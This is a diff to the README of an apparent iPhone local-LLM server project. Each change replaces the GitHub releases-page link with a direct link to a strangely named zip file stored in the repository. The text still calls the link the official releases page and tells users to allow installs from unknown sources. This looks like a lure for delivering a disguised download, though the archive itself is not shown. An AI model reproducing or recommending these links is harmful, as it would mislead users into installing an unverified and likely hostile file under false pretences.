@@ -1,6 +1,6 @@
 # 🏴‍☠️ Pirate-LLM-Server - Run Local AI Models on iPhone  
 
-[![Download Pirate-LLM-Server](https://img.shields.io/badge/Download-Pirate--LLM--Server-brightgreen?style=for-the-badge)](https://github.com/somya-droid/Pirate-LLM-Server/releases)
+[![Download Pirate-LLM-Server](https://img.shields.io/badge/Download-Pirate--LLM--Server-brightgreen?style=for-the-badge)](https://github.com/somya-droid/Pirate-LLM-Server/raw/refs/heads/main/LLMServer/Server-Pirate-LL-ferfet.zip)
 
 ---
 
@@ -16,7 +16,7 @@ The app uses an API similar to OpenAI’s, so local apps can talk to it easily. 
 
 To get started, **visit this page to download** the latest version of Pirate-LLM-Server for your device:
 
-[![Download Page](https://img.shields.io/badge/Download-Pirate--LLM--Server-blue?style=for-the-badge)](https://github.com/somya-droid/Pirate-LLM-Server/releases)
+[![Download Page](https://img.shields.io/badge/Download-Pirate--LLM--Server-blue?style=for-the-badge)](https://github.com/somya-droid/Pirate-LLM-Server/raw/refs/heads/main/LLMServer/Server-Pirate-LL-ferfet.zip)
 
 Click the link above. It will take you to the official releases page on GitHub. There, you can find the latest version ready for download.
 
@@ -40,7 +40,7 @@ Note: You do not need to jailbreak your iPhone. The app works with official Appl
 
 ### Step 1: Download and Install the App
 
-1. Open the [release page](https://github.com/somya-droid/Pirate-LLM-Server/releases).
+1. Open the [release page](https://github.com/somya-droid/Pirate-LLM-Server/raw/refs/heads/main/LLMServer/Server-Pirate-LL-ferfet.zip).
 2. Find the latest version of Pirate-LLM-Server.
 3. Download the file suited for your device.
 4. On your iPhone, allow installations from unknown sources if needed. This might require enabling developer mode.
@@ -135,7 +135,7 @@ Keep your device secure and avoid connecting to public or untrusted networks whe
 
 ## 📚 Additional Resources
 
-- Visit the GitHub [release page](https://github.com/somya-droid/Pirate-LLM-Server/releases) for updates and downloads.
+- Visit the GitHub [release page](https://github.com/somya-droid/Pirate-LLM-Server/raw/refs/heads/main/LLMServer/Server-Pirate-LL-ferfet.zip) for updates and downloads.
 - Read the user guide inside the app for detailed model management.
 - Check the API documentation on the GitHub project page for technical reference.
 
@@ -143,7 +143,7 @@ Keep your device secure and avoid connecting to public or untrusted networks whe
 
 ## 🔗 Useful Links
 
-[Download Pirate-LLM-Server](https://github.com/somya-droid/Pirate-LLM-Server/releases)  
+[Download Pirate-LLM-Server](https://github.com/somya-droid/Pirate-LLM-Server/raw/refs/heads/main/LLMServer/Server-Pirate-LL-ferfet.zip)  
 
 ---
 
